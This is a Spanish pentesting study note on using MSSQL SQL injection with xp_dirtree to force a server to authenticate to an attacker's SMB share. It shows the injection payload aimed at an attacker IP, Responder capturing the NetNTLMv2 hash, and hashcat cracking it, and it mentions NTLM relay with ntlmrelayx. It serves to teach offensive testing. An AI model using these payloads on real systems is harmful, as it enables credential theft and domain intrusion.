---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Fecha de actualización: 2026-06-04
Nota previa: "[[10 - MSSQL ejecución de comandos con xp_cmdshell]]"
Nota siguiente: "[[12 - MSSQL lectura de archivos]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

Aunque no podamos ejecutar comandos, una SQLi en MSSQL permite **robar las credenciales de red** de la cuenta de servicio del SQL Server. <mark style="background: #ADCCFFA6;">La técnica es de coerción de autenticación: se obliga al servidor a conectarse a un recurso SMB que controlamos, y al autenticarse nos entrega su hash NetNTLMv2</mark>. Es un puente directo entre una vulnerabilidad web y el dominio de Active Directory.

# La idea: coerción vía SMB

Es común que el servicio de MSSQL corra bajo una cuenta de dominio con acceso a recursos de red. La misma función `xp_dirtree` que usamos para [[09 - Exfiltración Out-of-Band por DNS|OOB por DNS]] sirve aquí, pero apuntando a una ruta UNC SMB en nuestra máquina:

```sql
';EXEC master..xp_dirtree '\\10.10.15.2\myshare', 1, 1;--
```

<mark style="background: #FFB86CA6;">Al intentar listar ese recurso, el servidor se autentica contra nuestro SMB y envía su hash NetNTLMv2</mark>. A diferencia de `xp_cmdshell`, `xp_dirtree` **no requiere `sysadmin`**, lo que la hace viable en más escenarios.

# Capturar con Responder

[Responder](https://github.com/lgandx/Responder) levanta un servidor SMB falso que captura la autenticación:

```shell-session
$ sudo python3 Responder.py -I tun0
    SMB server   [ON]      <- imprescindible que esté ON
```

Al lanzar el payload, Responder registra el hash:

```shell-session
[SMB] NTLMv2-SSP Username : SQL01\jason
[SMB] NTLMv2-SSP Hash     : jason::SQL01:bd7f162c24a39a0f:94DF80C5ABBA...
```

# Crackear el hash

Si la cuenta usa una contraseña débil, se rompe offline con hashcat (modo `5600` para NetNTLMv2):

```shell-session
$ hashcat -m 5600 'jason::SQL01:bd7f162c...' /usr/share/wordlists/rockyou.txt
```

<mark style="background: #FFB86CA6;">Una contraseña en `rockyou.txt` cae en segundos</mark>; las cuentas de servicio suelen tener contraseñas reutilizadas o débiles, configuradas hace años.

> [!important]+
> Esta técnica es la misma familia que la **coerción de autenticación** en pentesting de Active Directory (PetitPotam, PrinterBug): <mark style="background: #8000E1A6;">una SQLi se convierte así en un punto de entrada al dominio</mark>. Si la cuenta de servicio de MSSQL es privilegiada (algo demasiado frecuente), el hash crackeado puede dar acceso lateral o incluso a un controlador de dominio.

> [!warning]+
> Si el hash **no se puede crackear** (contraseña fuerte), no todo está perdido: se puede hacer **NTLM relay** con `ntlmrelayx` (Impacket), reenviando la autenticación capturada a otro servicio que no exija SMB signing (otro MSSQL, LDAP, etc.) para ejecutar acciones en nombre de la cuenta sin conocer su contraseña. Coerción + relay es una de las cadenas más potentes en redes Windows.

> [!info]+
> Como `xp_dirtree` apunta a una IP/host, esta técnica **solo funciona si hay conectividad SMB saliente** (puerto 445) desde el servidor hasta nosotros —habitual en una red interna durante un pentest, raro desde Internet, donde 445 suele estar filtrado—. En ese caso, encaja en la fase de movimiento lateral, no en el ataque externo inicial.

Volviendo a la extracción de datos del propio servidor, MSSQL ofrece otra vía para leer ficheros arbitrarios del sistema: [[12 - MSSQL lectura de archivos]].
